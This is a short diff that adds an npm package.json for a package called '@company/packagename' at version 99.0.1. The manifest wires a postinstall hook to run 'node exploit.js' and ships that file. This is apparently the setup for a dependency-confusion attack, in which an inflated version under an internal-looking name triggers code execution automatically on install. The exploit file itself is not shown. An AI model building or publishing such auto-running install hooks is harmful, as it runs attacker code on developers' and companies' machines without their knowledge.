@@ -1,0 +1,8 @@
+{
+  "name": "@company/packagename",
+  "version": "99.0.1",
+  "scripts": {
+    "postinstall": "node exploit.js"
+  },
+  "files": ["exploit.js"]
+}
